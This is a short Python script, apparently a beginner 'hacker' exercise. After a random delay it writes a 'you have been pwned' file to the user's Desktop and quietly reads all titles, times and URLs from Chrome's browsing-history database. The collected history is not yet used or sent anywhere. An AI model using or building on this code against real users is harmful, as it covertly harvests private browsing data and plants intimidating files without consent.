import os
from time import sleep
from random import randrange
import sqlite3

home_path = "/home/" + os.getlogin()
desktop_path = home_path + "/Desktop/"
FILE = desktop_path + "eps3.7dont-delete-me.ko"
history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/History"


def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} Segundos...".format(n_hours))
    sleep(n_hours)


def create_hacker_file():
    with open(FILE, 'w') as hacker_file:
        hacker_file.write("you have been pwned")

    return hacker_file


def get_chrome_history():
    try:
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        connection.close()
        return urls
    except sqlite3.OperationalError:
        return None


def main():

    delay_action()
    hacker_file = create_hacker_file()
    chrome_history = get_chrome_history()
    if chrome_history:
        pass


if __name__ == "__main__":
    main()
